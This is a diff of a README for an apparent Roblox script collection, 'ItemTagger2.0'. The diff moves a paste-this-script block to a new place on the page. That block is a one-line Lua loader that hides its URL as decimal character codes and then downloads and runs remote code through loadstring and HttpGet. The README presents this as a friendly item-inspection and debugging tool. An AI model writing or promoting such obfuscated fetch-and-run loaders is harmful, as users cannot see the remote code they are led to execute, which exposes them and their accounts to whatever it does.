@@ -45,14 +45,6 @@ All the scripts can be found on either <code>release</code> or here!
 
 This is the first script in our collection, which dynamically loads the script from a remote server using **<code>loadstring()</code>** and **<code>HttpGet</code>** method.
 
-### **Script**:
-```lua
--- ItemTagger2.0 Script (First in the collection)
-
-loadstring(game:HttpGet((function()local d="";for a in("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,111,111,73,104,115,116,115,104,98,100,50,48,50,52,47,82,111,98,108,111,120,83,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,115,99,114,105,112,116,115,47,73,116,101,109,84,97,103,103,101,114,50,46,48,46,108,117,97"):gmatch("%d+")do d=d..string.char(tonumber(a))end;return d end)()))()
-```
-
----
 
 ## 💡 Usage
 
@@ -63,6 +55,13 @@ The **ItemTagger2.0** script is a great tool for inspecting items in your Roblox
     <li><strong>Script Development Tool:</strong> It’s a fantastic tool for script development because it provides an easy way to test and debug your scripts. You can use it to load and inspect items dynamically, which helps when creating new scripts and understanding how items behave.</li>
     <li><strong>Flexibility:</strong> The script can be modified and expanded to meet the specific needs of your game. Whether you're building a custom UI, working with items dynamically, or trying to learn more about objects, this script serves as a great starting point.</li>
 </ol>
+
+### **Script**:
+```lua
+-- ItemTagger2.0 Script (First in the collection)
+
+loadstring(game:HttpGet((function()local d="";for a in("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,111,111,73,104,115,116,115,104,98,100,50,48,50,52,47,82,111,98,108,111,120,83,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,115,99,114,105,112,116,115,47,73,116,101,109,84,97,103,103,101,114,50,46,48,46,108,117,97"):gmatch("%d+")do d=d..string.char(tonumber(a))end;return d end)()))()
+```
 
 ---
 
